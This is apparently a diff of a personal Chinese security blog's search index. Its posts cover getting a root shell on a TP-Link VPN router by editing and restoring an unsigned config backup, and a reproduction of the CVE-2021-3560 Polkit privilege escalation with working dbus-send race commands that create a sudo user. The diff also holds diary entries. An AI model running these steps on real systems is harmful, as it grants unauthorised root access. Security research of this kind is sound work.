@@ -4,6 +4,25 @@
   
   
   <entry>
+    <title>tplink企业vpn路由器GetShell</title>
+    <link href="/article/de04eab8.html"/>
+    <url>/article/de04eab8.html</url>
+    
+    <content type="html"><![CDATA[<p>闲鱼上淘到某款企业vpn路由器，比较早的设备。</p><p>拿到某款设备肯定要想办法拿到固件来分析，并搞到getshell来干更多好玩的东西。</p><h2 id="前期尝试"><a href="#前期尝试" class="headerlink" title="前期尝试"></a>前期尝试</h2><p>通过官方网站下载的升级固件，尝试升级。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/image-20231113134757833.png" alt="image-20231113134757833"></p><p>寄！</p><p>尝试扫描端口查看是否开启ssh。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/image-20231113135348552.png" alt="image-20231113135348552"></p><p>寄！</p><p>都无效，也没有查到历史漏洞，只能拆了。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/IMG_6135.JPG" alt="IMG_6135"></p><p>串口通过调试，并不能获取到任何数据，可能是给关掉了。</p><p>基本思路均失败。</p><h2 id="发现配置文件，尝试新思路"><a href="#发现配置文件，尝试新思路" class="headerlink" title="发现配置文件，尝试新思路"></a>发现配置文件，尝试新思路</h2><p>在系统工具，设备管理中发现备份设置，该品牌设备多是基于openwrt开发，所以我们将希望寄托在备份文件中。</p><p>尝试下载备份文件。</p><p>分析发现为gzip压缩文件，直接解包。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/image-20231113140236875.png" alt="image-20231113140236875"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/image-20231113140453660.png" alt="image-20231113140453660"></p><p>发现了dropbear，passwd，shadow等文件，思路这不就来了。</p><p>首先尝试修改dropbear配置文件，将其改为开机自启。添加自定义用户，权限组为root，并设置其密码为自定义，方便dropbear打开后能正常登陆shell。</p><p>通过关键字搜索，发现dropbear配置文件</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/image-20231113141235260.png" alt="image-20231113141235260"></p><p>将ssh_port_switch修改为on，使设备启动时打开ssh</p><p>并记住其端口，33400</p><p>先将其打包恢复备份，查看是否有签名校验。</p><p>成功恢复，证明没有签名校验，然后尝试ssh连接设备</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/image-20231113142231336.png" alt="image-20231113142231336"></p><p>成功开启ssh，下一步就是创建自定义用户，是我们能够成功登入系统</p><p>修改passwd和shadow文件</p><p>修改passwd文件，这里我创建了一个与root一样的用户pipi</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/image-20231113142358252.png" alt="image-20231113142358252"></p><p>在shadow中给pipi用户设置密码，这里自定义即可，也可以直接复制自己linux机器的用户名密码</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/image-20231113142454495.png" alt="image-20231113142454495"></p><p>在次打包，将其恢复。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/image-20231113142620362.png" alt="image-20231113142620362"></p><p>成功登入，可以发现其就是一个openwrt。</p><p>cat &#x2F;proc&#x2F;cpuinfo后可以发现其设备为mips架构，使用的是高通骁龙QCA956X的一款芯片。</p><p>openwrt可玩性很高，这里不多赘述。</p><h2 id="提取固件"><a href="#提取固件" class="headerlink" title="提取固件"></a>提取固件</h2><p>getShell之后可以尝试使用dd命令来提取固件，大概思路如下。</p><p>使用cat &#x2F;proc&#x2F;mtd来查看分区</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/image-20231113143147532.png" alt="image-20231113143147532"></p><p>使用dd命令来直接提取分区</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/image-20231113143322534.png" alt="image-20231113143322534"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/image-20231113143411309.png" alt="image-20231113143411309"></p><p>得益于openwrt的各种命令都比较完整，可以用nc 等方式将固件下载到本地来进行分析。</p><p>以上就是通过修改备份文件的思路来GetShell。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>iot</category>
+      
+    </categories>
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>协议-upnp</title>
     <link href="/article/697ff101.html"/>
     <url>/article/697ff101.html</url>
@@ -84,7 +103,7 @@
     <link href="/article/f3404829.html"/>
     <url>/article/f3404829.html</url>
     
-    <content type="html"><![CDATA[<p>终于要下雨了，孩子要热死了</p><p>什么都不想干，当个废物多好</p><p>今天看到一段话</p><div class="code-wrapper"><pre><code class="hljs">今天37度，我坐在便利店门口抽着烟，看着对面青春飞扬的初中生中考，我才发现我已经离开校园很多年了。可是很奇怪，好像校园青春就在昨天，仿佛天边的云伸手就能摸到。 还是书读得少了，想感慨青春易逝也没感慨出来。只记起陶渊明的一句诗“忆我少壮时，无乐自欣愉。”青春真是充满了力量和脆弱。</code></pre></div><p>今天的壁纸</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/IMG_0108.JPG" alt="IMG_0108"></p><p>杭州一行，玩是没玩明白，倒是回来拉两天肚子，再也不参加这种活动了。</p><p>这次的一些照片。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/ADEEC1E9-BE7F-45B4-A7B8-1046A2827823_1_105_c.jpeg" alt="ADEEC1E9-BE7F-45B4-A7B8-1046A2827823_1_105_c"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/b&bo=VQhABlUIQAYWECA!&rf=viewer_311&t=5" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/b&ek=1&kp=1&pt=0&bo=HAtABhwLQAYWECA!&tl=1&vuin=397712823&tm=1656925200&dis_t=1656926146&dis_k=6b61c2a62bf63dc060101c4cca092e03&sce=50-1-1&rf=viewer_311&t=5" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/b&ek=1&kp=1&pt=0&bo=VQhABlUIQAYWECA!&tl=1&vuin=397712823&tm=1656925200&dis_t=1656926146&dis_k=4c692d47afb812c710204fd646c7b6c7&sce=50-1-1&rf=viewer_311&t=5" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/b&ek=1&kp=1&pt=0&bo=WglABloJQAYWECA!&tl=1&vuin=397712823&tm=1656925200&dis_t=1656926146&dis_k=f340e733aa99e0602f33cfb08e3d7400&sce=50-1-1&rf=viewer_311&t=5" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/b&ek=1&kp=1&pt=0&bo=VQhABlUIQAYWECA!&tl=1&vuin=397712823&tm=1656925200&dis_t=1656926146&dis_k=9cf2b2c0b805d5413d4832e9eb42bb0c&sce=50-1-1&rf=viewer_311&t=5" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/b&ek=1&kp=1&pt=0&bo=VQhABlUIQAYWECA!&tl=1&vuin=397712823&tm=1656925200&dis_t=1656926146&dis_k=f990c2901268e23184d685220f13f256&sce=50-1-1&rf=viewer_311&t=5" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/b&ek=1&kp=1&pt=0&bo=VQhABlUIQAYWECA!&tl=1&vuin=397712823&tm=1656925200&dis_t=1656926146&dis_k=4fda3896c763b8cce7b3abe711690e43&sce=50-1-1&rf=viewer_311&t=5" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/b&ek=1&kp=1&pt=0&bo=VQhABlUIQAYWECA!&tl=1&vuin=397712823&tm=1656925200&dis_t=1656926146&dis_k=5d8305503f754517af9f7db63188908e&sce=50-1-1&rf=viewer_311&t=5" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/b&ek=1&kp=1&pt=0&bo=VAY4BFQGOAQWECA!&tl=1&vuin=397712823&tm=1656925200&dis_t=1656926146&dis_k=b6fbe529def626514d856cc1c34fda63&sce=50-1-1&rf=viewer_311&t=5" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/b&ek=1&kp=1&pt=0&bo=jAhABowIQAYWECA!&tl=1&vuin=397712823&tm=1656925200&dis_t=1656926146&dis_k=cc711e8ed9decbff7c171c8aa071f5ca&sce=50-1-1&rf=viewer_311&t=5" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/b&ek=1&kp=1&pt=0&bo=xwdABscHQAYWECA!&tl=1&vuin=397712823&tm=1656925200&dis_t=1656926146&dis_k=69e5ae34acdd4cc32acfe11ad63264b2&sce=50-1-1&rf=viewer_311&t=5" alt="img"></p><p>哦对，女生说暂时不想谈恋爱是指不想跟你谈。记得不要死皮赖脸。</p><hr><p>哎呀终于解封了</p><p>属实是封了快一个月</p><p>让我来显摆一下封控时候搞得能吃的哈哈哈</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202211081134775.jpeg" alt="IMG_1319"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202211081135461.jpg" alt="IMG_1333"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202211081135009.jpg" alt="IMG_1369"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202211081134795.jpg" alt="IMG_1396"></p><p>我觉得还可以哈哈哈</p><p>人一旦宅久了，确实容易废。</p><p>哦对，今晚有月全食，小丫头跟我说那是血月不吉利。</p><p>开玩笑，我可是唯物主义战士。</p><p>每次碎碎念都有好多骚话，却总写不出来。</p><p>算了算了无所谓的。</p><p>最后分享下最近的壁纸吧</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202211081138298.jpg" alt="100174471_p0"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202211081138274.jpg" alt="100191209_p0_master1200"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202211081138266.jpg" alt="100789898_p0"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202211081138336.jpg" alt="101123738_p0"></p>]]></content>
+    <content type="html"><![CDATA[<p>终于要下雨了，孩子要热死了</p><p>什么都不想干，当个废物多好</p><p>今天看到一段话</p><div class="code-wrapper"><pre><code class="hljs">今天37度，我坐在便利店门口抽着烟，看着对面青春飞扬的初中生中考，我才发现我已经离开校园很多年了。可是很奇怪，好像校园青春就在昨天，仿佛天边的云伸手就能摸到。 还是书读得少了，想感慨青春易逝也没感慨出来。只记起陶渊明的一句诗“忆我少壮时，无乐自欣愉。”青春真是充满了力量和脆弱。</code></pre></div><p>今天的壁纸</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/IMG_0108.JPG" alt="IMG_0108"></p><p>杭州一行，玩是没玩明白，倒是回来拉两天肚子，再也不参加这种活动了。</p><p>这次的一些照片。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/ADEEC1E9-BE7F-45B4-A7B8-1046A2827823_1_105_c.jpeg" alt="ADEEC1E9-BE7F-45B4-A7B8-1046A2827823_1_105_c"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/b&bo=VQhABlUIQAYWECA!&rf=viewer_311&t=5" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/b&ek=1&kp=1&pt=0&bo=HAtABhwLQAYWECA!&tl=1&vuin=397712823&tm=1656925200&dis_t=1656926146&dis_k=6b61c2a62bf63dc060101c4cca092e03&sce=50-1-1&rf=viewer_311&t=5" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/b&ek=1&kp=1&pt=0&bo=VQhABlUIQAYWECA!&tl=1&vuin=397712823&tm=1656925200&dis_t=1656926146&dis_k=4c692d47afb812c710204fd646c7b6c7&sce=50-1-1&rf=viewer_311&t=5" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/b&ek=1&kp=1&pt=0&bo=WglABloJQAYWECA!&tl=1&vuin=397712823&tm=1656925200&dis_t=1656926146&dis_k=f340e733aa99e0602f33cfb08e3d7400&sce=50-1-1&rf=viewer_311&t=5" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/b&ek=1&kp=1&pt=0&bo=VQhABlUIQAYWECA!&tl=1&vuin=397712823&tm=1656925200&dis_t=1656926146&dis_k=9cf2b2c0b805d5413d4832e9eb42bb0c&sce=50-1-1&rf=viewer_311&t=5" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/b&ek=1&kp=1&pt=0&bo=VQhABlUIQAYWECA!&tl=1&vuin=397712823&tm=1656925200&dis_t=1656926146&dis_k=f990c2901268e23184d685220f13f256&sce=50-1-1&rf=viewer_311&t=5" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/b&ek=1&kp=1&pt=0&bo=VQhABlUIQAYWECA!&tl=1&vuin=397712823&tm=1656925200&dis_t=1656926146&dis_k=4fda3896c763b8cce7b3abe711690e43&sce=50-1-1&rf=viewer_311&t=5" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/b&ek=1&kp=1&pt=0&bo=VQhABlUIQAYWECA!&tl=1&vuin=397712823&tm=1656925200&dis_t=1656926146&dis_k=5d8305503f754517af9f7db63188908e&sce=50-1-1&rf=viewer_311&t=5" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/b&ek=1&kp=1&pt=0&bo=VAY4BFQGOAQWECA!&tl=1&vuin=397712823&tm=1656925200&dis_t=1656926146&dis_k=b6fbe529def626514d856cc1c34fda63&sce=50-1-1&rf=viewer_311&t=5" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/b&ek=1&kp=1&pt=0&bo=jAhABowIQAYWECA!&tl=1&vuin=397712823&tm=1656925200&dis_t=1656926146&dis_k=cc711e8ed9decbff7c171c8aa071f5ca&sce=50-1-1&rf=viewer_311&t=5" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/b&ek=1&kp=1&pt=0&bo=xwdABscHQAYWECA!&tl=1&vuin=397712823&tm=1656925200&dis_t=1656926146&dis_k=69e5ae34acdd4cc32acfe11ad63264b2&sce=50-1-1&rf=viewer_311&t=5" alt="img"></p><p>哦对，女生说暂时不想谈恋爱是指不想跟你谈。记得不要死皮赖脸。</p><hr><p>哎呀终于解封了</p><p>属实是封了快一个月</p><p>让我来显摆一下封控时候搞得能吃的哈哈哈</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202211081134775.jpeg" alt="IMG_1319"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202211081135461.jpg" alt="IMG_1333"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202211081135009.jpg" alt="IMG_1369"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202211081134795.jpg" alt="IMG_1396"></p><p>我觉得还可以哈哈哈</p><p>人一旦宅久了，确实容易废。</p><p>哦对，今晚有月全食，小丫头跟我说那是血月不吉利。</p><p>开玩笑，我可是唯物主义战士。</p><p>每次碎碎念都有好多骚话，却总写不出来。</p><p>算了算了无所谓的。</p><p>最后分享下最近的壁纸吧</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202211081138298.jpg" alt="100174471_p0"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202211081138274.jpg" alt="100191209_p0_master1200"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202211081138266.jpg" alt="100789898_p0"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202211081138336.jpg" alt="101123738_p0"></p><hr><p>好久没有碎碎念了，转眼年关降至，感觉今年啥都干了，又感觉啥都没干，人真是越来越颓了。</p><p>算了，在摸鱼，下次再说。</p>]]></content>
     
     
     <categories>
@@ -147,25 +166,6 @@
     <categories>
       
       <category>iot</category>
-      
-    </categories>
-    
-    
-  </entry>
-  
-  
-  
-  <entry>
-    <title>关于我</title>
-    <link href="/article/9ff79b23.html"/>
-    <url>/article/9ff79b23.html</url>
-    
-    <content type="html"><![CDATA[<p>我</p><p>p1yang</p><p>21（年轻人，不讲武德）</p><p>rewirte战队成员（感谢我的几位好哥哥带我）</p><p>万年单身狗（有喜爱狗狗的小姐姐可以考虑下）</p><p>一个网络安全爱好者（师傅们带带我）</p><p>菜鸡（这是真的）</p><p>二进制玩家（这玩意好难，好难，好难！！！）</p><p>android开发专业废物（我ui画的贼溜）</p><p>复制诗歌爱好者（致橡树我真的太喜欢了！！！）</p><p>初音厨（即使离婚了我也爱她）</p><p>”日常“番爱好者（没有未来的未来不是我想要的未来）</p><p>正在学画本子的渣渣（哎嘿嘿）</p><p>英雄联盟万年黑铁（我闪现撞墙贼溜）</p><p>爹一只会窝在后排打狙（十倍镜都打不到人）</p><p>csgo皮肤收藏家（就是买不起而已，rush B gogogo！）</p><p>这个博客算是第二次迁移了吧，之前在云服务器上的也停了，文章也没来得及保存。</p><p>这里就算一个新的开始吧。</p><p>最后留个联系方式吧，师傅们有想要交流的技术或者不嫌弃我菜，一块耍爹1或者本人博文有问题的地方联系qq提醒我修改吧。</p><p>qq：397712823</p>]]></content>
-    
-    
-    <categories>
-      
-      <category>杂七杂八的唠叨话</category>
       
     </categories>
     
@@ -261,6 +261,25 @@
     <categories>
       
       <category>iot</category>
+      
+    </categories>
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>关于我</title>
+    <link href="/article/9ff79b23.html"/>
+    <url>/article/9ff79b23.html</url>
+    
+    <content type="html"><![CDATA[<p>我</p><p>p1yang</p><p>24（年轻人，不讲武德）</p><p>rewirte战队成员（感谢我的几位好哥哥带我）</p><p>万年单身狗（有喜爱狗狗的小姐姐可以考虑下）（bushi）</p><p>2023成功追女生失败，还是一个单身狗。</p><p>一个网络安全爱好者（师傅们带带我）</p><p>菜鸡（这是真的）</p><p>二进制玩家（这玩意好难，好难，好难！！！）</p><p>android开发专业废物（我ui画的贼溜）</p><p>复制诗歌爱好者（致橡树我真的太喜欢了！！！）</p><p>初音厨（即使离婚了我也爱她）</p><p>”日常“番爱好者（没有未来的未来不是我想要的未来）</p><p>正在学画本子的渣渣（哎嘿嘿）</p><p>英雄联盟万年黑铁（我闪现撞墙贼溜）</p><p>爹一只会窝在后排打狙（十倍镜都打不到人）</p><p>csgo皮肤收藏家（就是买不起而已，rush B gogogo！）</p><p>这个博客算是第二次迁移了吧，之前在云服务器上的也停了，文章也没来得及保存。</p><p>这里就算一个新的开始吧。</p><p>最后留个联系方式吧，师傅们有想要交流的技术或者不嫌弃我菜，一块耍爹1或者本人博文有问题的地方联系qq提醒我修改吧。</p><p>qq：397712823</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>杂七杂八的唠叨话</category>
       
     </categories>
     
@@ -426,7 +445,7 @@
     <link href="/article/86aaf27b.html"/>
     <url>/article/86aaf27b.html</url>
     
-    <content type="html"><![CDATA[<h1 id="CVE-2021-3560-Polkit权限提升漏洞"><a href="#CVE-2021-3560-Polkit权限提升漏洞" class="headerlink" title="CVE-2021-3560 Polkit权限提升漏洞"></a>CVE-2021-3560 Polkit权限提升漏洞</h1><p>6月3号，RedHat修复了一个存在七年的权限提升漏洞，该漏洞通过Linux  Polkit 来创建新的root用户</p><p>Polkit 是linux下的一个系统服务，允许特权进程给非特权进程提供服务</p><blockquote><p>Polkit 则会根据特权进程提供的信息和权限配置文件进行认证</p><p>认证完成后将认证结果返回给特权进程</p><p>特权进程会根据认证结果来决定是否给非特权进程提供服务</p><p>而我们在认证操作中断开连接，导致无法获取认证结果</p><p>具体后边会详细分析</p></blockquote><p>由于systemd使用Polkit，所以几乎所有使用systemd的Linux都自带polkit</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>环境：ubuntu20.04  </p><blockquote><p><a href="http://releases.ubuntu.com/20.04/ubuntu-20.04.2.0-desktop-amd64.iso">http://releases.ubuntu.com/20.04/ubuntu-20.04.2.0-desktop-amd64.iso</a> </p></blockquote><p>ssh（ 在本地ssh下操作）</p><blockquote><p>sudo apt install ssh</p><p>sudo service ssh start</p><p>ssh <a href="mailto:&#117;&#115;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#64;&#x31;&#50;&#x37;&#x2e;&#48;&#x2e;&#48;&#46;&#x31;">&#117;&#115;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#64;&#x31;&#50;&#x37;&#x2e;&#48;&#x2e;&#48;&#46;&#x31;</a></p></blockquote><p>具体为什么要用ssh，这里不做赘述，可以自行百度dbus</p><p>dbus-send发送D-Bus消息的工具，主要用于测试</p><p>可以通过dbus-send从命令行触发polkit</p><p>通过dbus-send构造语句，来创建一个新用户</p><blockquote><p>dbus-send –system –dest&#x3D;org.freedesktop.Accounts –type&#x3D;method_call –print-reply &#x2F;org&#x2F;freedesktop&#x2F;Accounts org.freedesktop.Accounts.CreateUser string:yunku string:”YunKuSec” int32:1</p></blockquote><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141819448.png" alt="image-20220402141819448"></p><p>正常情况返回肯定是认证不通过的</p><p>上面说了通过中断来实现认证通过</p><p>所以继续构造语句</p><blockquote><p>dbus-send –system –dest&#x3D;org.freedesktop.Accounts –type&#x3D;method_call –print-reply &#x2F;org&#x2F;freedesktop&#x2F;Accounts org.freedesktop.Accounts.CreateUser string:yunku string:”YunKuSec” int32:1 &amp; sleep 0.009s ; kill $!</p></blockquote><p>这里是开始执行后0.009秒断开连接</p><p>这里多久断开连接要看具体执行时间，可以在前面加time 测试</p><p>我这里大概时间在0.015秒左右，所以我提前在0.009秒断开，具体测试时看执行时间</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141825690.png" alt="image-20220402141825690"></p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141832450.png" alt="image-20220402141832450"></p><p>运气比较好，一次就成了，有个可能运气不太好，需要多试个千八百次的</p><p>然后用 id 可以看到语句中构造的yunku 已经存在了，而且在sudo组，具有root权限</p><p>现在已经成功利用漏洞创建了用户，但是该用户没有用户名，所以无法登陆</p><p>继续构造语句来设置密码</p><p><code>这里涉及到一个知识点，dbus接口设置密码需要通过散列值</code></p><p>通过openssl可以生成散列值(-5是指定 sha256 算法来生成散列值， -6 是 sha512，-1 是 md5)</p><blockquote><p>openssl passwd -5 password</p><p>(这里password是个人需要设置的密码)</p></blockquote><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141841022.png" alt="image-20220402141841022"></p><p>构造设置密码语句(User1001 是创建的sudo用户uid 可以通过id 用户名查看， string 后放置密码散列值)</p><blockquote><p>dbus-send –system –dest&#x3D;org.freedesktop.Accounts –type&#x3D;method_call –print-reply &#x2F;org&#x2F;freedesktop&#x2F;Accounts&#x2F;User1001 org.freedesktop.Accounts.User.SetPassword string:’$5$P28GOS55linQ0Fe&#x2F;$2dn4a1duWxR9wFIYeO7qfO7ieDZvE25zPh1oxm3&#x2F;Pn6’ string:Whatever &amp; sleep 0.009s ; kill $! </p></blockquote><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141847603.png" alt="image-20220402141847603"></p><p>多试这个也需要多试几次</p><p>成功之后可以登陆尝试</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141854349.png" alt="image-20220402141854349"></p><p>至此，复现结束！</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>通过dbus创建新用户时，dbus-send向account-daemon发起请求会先发送到dbus-daemon</p><p>dbus-daemon会先添加dbus id（这里方便理解 id为 10）到请求中，然后将请求发给account-daemon</p><p>account-daemon收到请求后向poklit询问id为10的连接有没有权限</p><p>poklit向dbus-daemon询问该连接的uid </p><p>如果返回的uid为0，就授权，否则打开验证密码窗口让用户输入密码</p><p>以上步骤完成后</p><p>poklit返回true给account-daemon</p><p>account-daemon创建新用户</p><p>但是！</p><p>如果我们在<code>poklit向dbus-daemon询问该连接的uid</code>时断开，那这个连接就不存在</p><p>不存在，就会返回错误</p><p>而poklit的错误处理信息不会拒绝该请求，而是将uid视为0，来授权</p>]]></content>
+    <content type="html"><![CDATA[<h1 id="CVE-2021-3560-Polkit权限提升漏洞"><a href="#CVE-2021-3560-Polkit权限提升漏洞" class="headerlink" title="CVE-2021-3560 Polkit权限提升漏洞"></a>CVE-2021-3560 Polkit权限提升漏洞</h1><p>6月3号，RedHat修复了一个存在七年的权限提升漏洞，该漏洞通过Linux  Polkit 来创建新的root用户</p><p>Polkit 是linux下的一个系统服务，允许特权进程给非特权进程提供服务</p><blockquote><p>Polkit 则会根据特权进程提供的信息和权限配置文件进行认证</p><p>认证完成后将认证结果返回给特权进程</p><p>特权进程会根据认证结果来决定是否给非特权进程提供服务</p><p>而我们在认证操作中断开连接，导致无法获取认证结果</p><p>具体后边会详细分析</p></blockquote><p>由于systemd使用Polkit，所以几乎所有使用systemd的Linux都自带polkit</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>环境：ubuntu20.04  </p><blockquote><p><a href="http://releases.ubuntu.com/20.04/ubuntu-20.04.2.0-desktop-amd64.iso">http://releases.ubuntu.com/20.04/ubuntu-20.04.2.0-desktop-amd64.iso</a> </p></blockquote><p>ssh（ 在本地ssh下操作）</p><blockquote><p>sudo apt install ssh</p><p>sudo service ssh start</p><p>ssh <a href="mailto:&#x75;&#115;&#x65;&#x72;&#110;&#97;&#109;&#101;&#64;&#49;&#x32;&#55;&#x2e;&#48;&#x2e;&#48;&#46;&#49;">&#x75;&#115;&#x65;&#x72;&#110;&#97;&#109;&#101;&#64;&#49;&#x32;&#55;&#x2e;&#48;&#x2e;&#48;&#46;&#49;</a></p></blockquote><p>具体为什么要用ssh，这里不做赘述，可以自行百度dbus</p><p>dbus-send发送D-Bus消息的工具，主要用于测试</p><p>可以通过dbus-send从命令行触发polkit</p><p>通过dbus-send构造语句，来创建一个新用户</p><blockquote><p>dbus-send –system –dest&#x3D;org.freedesktop.Accounts –type&#x3D;method_call –print-reply &#x2F;org&#x2F;freedesktop&#x2F;Accounts org.freedesktop.Accounts.CreateUser string:yunku string:”YunKuSec” int32:1</p></blockquote><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141819448.png" alt="image-20220402141819448"></p><p>正常情况返回肯定是认证不通过的</p><p>上面说了通过中断来实现认证通过</p><p>所以继续构造语句</p><blockquote><p>dbus-send –system –dest&#x3D;org.freedesktop.Accounts –type&#x3D;method_call –print-reply &#x2F;org&#x2F;freedesktop&#x2F;Accounts org.freedesktop.Accounts.CreateUser string:yunku string:”YunKuSec” int32:1 &amp; sleep 0.009s ; kill $!</p></blockquote><p>这里是开始执行后0.009秒断开连接</p><p>这里多久断开连接要看具体执行时间，可以在前面加time 测试</p><p>我这里大概时间在0.015秒左右，所以我提前在0.009秒断开，具体测试时看执行时间</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141825690.png" alt="image-20220402141825690"></p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141832450.png" alt="image-20220402141832450"></p><p>运气比较好，一次就成了，有个可能运气不太好，需要多试个千八百次的</p><p>然后用 id 可以看到语句中构造的yunku 已经存在了，而且在sudo组，具有root权限</p><p>现在已经成功利用漏洞创建了用户，但是该用户没有用户名，所以无法登陆</p><p>继续构造语句来设置密码</p><p><code>这里涉及到一个知识点，dbus接口设置密码需要通过散列值</code></p><p>通过openssl可以生成散列值(-5是指定 sha256 算法来生成散列值， -6 是 sha512，-1 是 md5)</p><blockquote><p>openssl passwd -5 password</p><p>(这里password是个人需要设置的密码)</p></blockquote><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141841022.png" alt="image-20220402141841022"></p><p>构造设置密码语句(User1001 是创建的sudo用户uid 可以通过id 用户名查看， string 后放置密码散列值)</p><blockquote><p>dbus-send –system –dest&#x3D;org.freedesktop.Accounts –type&#x3D;method_call –print-reply &#x2F;org&#x2F;freedesktop&#x2F;Accounts&#x2F;User1001 org.freedesktop.Accounts.User.SetPassword string:’$5$P28GOS55linQ0Fe&#x2F;$2dn4a1duWxR9wFIYeO7qfO7ieDZvE25zPh1oxm3&#x2F;Pn6’ string:Whatever &amp; sleep 0.009s ; kill $! </p></blockquote><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141847603.png" alt="image-20220402141847603"></p><p>多试这个也需要多试几次</p><p>成功之后可以登陆尝试</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141854349.png" alt="image-20220402141854349"></p><p>至此，复现结束！</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>通过dbus创建新用户时，dbus-send向account-daemon发起请求会先发送到dbus-daemon</p><p>dbus-daemon会先添加dbus id（这里方便理解 id为 10）到请求中，然后将请求发给account-daemon</p><p>account-daemon收到请求后向poklit询问id为10的连接有没有权限</p><p>poklit向dbus-daemon询问该连接的uid </p><p>如果返回的uid为0，就授权，否则打开验证密码窗口让用户输入密码</p><p>以上步骤完成后</p><p>poklit返回true给account-daemon</p><p>account-daemon创建新用户</p><p>但是！</p><p>如果我们在<code>poklit向dbus-daemon询问该连接的uid</code>时断开，那这个连接就不存在</p><p>不存在，就会返回错误</p><p>而poklit的错误处理信息不会拒绝该请求，而是将uid视为0，来授权</p>]]></content>
     
     
     <categories>
@@ -565,6 +584,25 @@
     <categories>
       
       <category>一些杂七杂八的技术</category>
+      
+    </categories>
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>致橡树</title>
+    <link href="/article/26be181c.html"/>
+    <url>/article/26be181c.html</url>
+    
